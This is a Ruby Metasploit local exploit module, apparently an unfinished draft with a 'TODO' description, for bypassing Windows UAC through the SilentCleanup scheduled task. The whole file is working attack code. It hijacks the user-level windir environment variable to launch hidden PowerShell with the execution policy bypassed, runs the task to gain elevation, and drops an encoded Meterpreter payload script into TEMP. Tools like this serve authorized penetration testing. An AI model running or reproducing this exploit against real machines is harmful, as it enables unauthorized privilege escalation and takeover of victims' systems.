##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::Powershell
  include Post::Windows::Priv
  include Msf::Post::File
  include Msf::Post::Common
  include Msf::Exploit::FileDropper

  
  PSH_PATH = "%WINDIR%\\System32\\WindowsPowershell\\v1.0\\powershell.exe"

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Escalate UAC Protection Bypass (Via SilentCleanup)",
      'Description'          => %q{
        TODO
      },
      'License'              => MSF_LICENSE,
      'Author'               => [
        'Carter Brainerd (cbrnrd)',  # Metasploit Module
        'lokiuox',     # Vuln discovery
        'enigma0x3'    # Vuln discovery
      ],
      'Platform' => ['win'],
      'SessionTypes' => ['meterpreter'],
      'Targets'       => [
        [ 'Windows Powershell', {  } ]
    ],
    ))

    register_options(
      [
        OptInt.new('SLEEPTIME', [false, "The time (ms) to sleep before running SilentCleanup", 0])
      ], self.class)
  end

  

  def get_bypass_script(cmd)
    scr = %Q{
      if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
        #{cmd}
      } else {
          $registryPath = "HKCU:\\Environment"
          $Name = "windir"
          $Value = "powershell -ExecutionPolicy bypass -windowstyle hidden -Command `"& `'$PSCommandPath`'`";#"
          Set-ItemProperty -Path $registryPath -Name $name -Value $Value
          #Depending on the performance of the machine, some sleep time may be required before or after schtasks
          Start-Sleep -Milliseconds #{datastore['SLEEPTIME']}
          schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I | Out-Null
          Remove-ItemProperty -Path $registryPath -Name $name
      }
    }
    vprint_status(scr)
    scr
  end

  def exploit
    check_permissions!

    e_vars = get_envs('TEMP')
    payload_fp = "#{e_vars['TEMP']}\\#{rand_text_alpha(8)}.ps1"


    # Write it to disk, run, delete
    upload_payload_ps1(payload_fp)
    vprint_good "Payload uploaded to #{payload_fp}"

    cmd_exec("#{expand_path(PSH_PATH)} -ep bypass #{payload_fp}")
  end


  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
    
  end


  def upload_payload_ps1(filepath)
    # FOR THE LIFE OF ME I CANNOT FIGURE THIS OUT
    pld = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
    begin
      vprint_status("Uploading payload PS1...")
      write_file(filepath, get_bypass_script(pld))
      register_file_for_cleanup(filepath)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(Failure::Unknown, "Error uploading file #{filepath}: #{e.class} #{e}")
    end
  end

end
